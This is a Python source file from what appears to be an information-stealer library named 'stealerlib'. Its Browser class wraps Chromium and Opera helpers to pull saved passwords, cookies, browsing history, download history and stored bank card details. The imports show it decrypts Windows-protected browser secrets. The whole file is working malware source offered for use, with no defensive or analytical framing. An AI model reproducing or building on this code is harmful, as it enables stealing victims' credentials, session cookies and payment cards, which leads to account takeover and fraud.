#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
import win32crypt

from typing import Union
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData

from stealerlib.exceptions import catch
from stealerlib.datatypes import DataTypes

from stealerlib.browser.opera import Opera
from stealerlib.browser.chromium import Chromium


class Browser(Chromium, Opera):

    def __init__(self):
        Opera.__init__(self)
        Chromium.__init__(self)


    def get_passwords(self, type="all") -> Union[list[tuple], list[list]]:
        """Gets the saved userames and passwords for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect passwords from (default=all)

        Returns:
            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 

        Example:
            browser = Browser()
            passwords = browser.get_passwords() # browser.get_passwords(type='opera')
        """

        if type == "chromium":
            passwords = self.cget(self._chromium_passwords)
        elif type == "opera":
            passwords = self.oget(self._opera_passwords)
        else:
            passwords = [
                self.cget(self._chromium_passwords),
                self.oget(self._opera_passwords)
            ]

        return passwords

    def get_cookies(self, type="all") -> Union[list[list], list[list]]:
        """Gets the saved cookies for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from (default=all)

        Returns:
            list[list[str, ...]]: list of (host, expires?, expire_date, path, name, value) lists (derived from DataTypes conv()) 

        Example:
            browser = Browser()
            cookies = browser.get_cookies() # browser.get_cookies(type='opera')
        """

        if type == "chromium":
            cookies = self.cget(self._chromium_cookies)
        elif type == "opera":
            cookies = self.oget(self._opera_cookies)
        else:
            cookies = [
                self.cget(self._chromium_cookies),
                self.oget(self._opera_cookies)
            ]

        return cookies

    def get_history(self, type="all") -> Union[list[list], list[list]]:
        """Gets the saved browser history for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect web history from (default=all)

        Returns:
            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 

        Example:
            browser = Browser()
            history = browser.get_history() # browser.get_history(type='opera')
        """

        if type == "chromium":
            history = self.cget(self._chromium_history)
        elif type == "opera":
            history = self.oget(self._opera_history)
        else:
            history = [
                self.cget(self._chromium_history),
                self.oget(self._opera_history)
            ]

        return history

    def get_downloads(self, type="all") -> Union[list[list], list[list]]:
        """Gets the saved browser downloads for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect download history from (default=all)

        Returns:
            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 

        Example:
            browser = Browser()
            downloads = browser.get_downloads() # browser.get_download(type='opera')
        """

        if type == "chromium":
            downloads = self.cget(self._chromium_downloads)
        elif type == "opera":
            downloads = self.oget(self._opera_downloads)
        else:
            downloads = [
                self.cget(self._chromium_downloads),
                self.oget(self._opera_downloads)
            ]

        return downloads

    def get_cards(self, type="all") -> Union[list[list], list[list]]:
        """Gets the saved browser bank cards for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect bank cards from (default=all)

        Returns:
            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 

        Example:
            browser = Browser()
            cards = browser.get_cards() # browser.get_cards(type='opera')
        """

        if type == "chromium":
            cards = self.cget(self._chromium_credit_cards)
        elif type == "opera":
            cards = self.oget(self._opera_credit_cards)
        else:
            cards = [
                self.cget(self._chromium_credit_cards),
                self.oget(self._opera_credit_cards)
            ]

        return cards
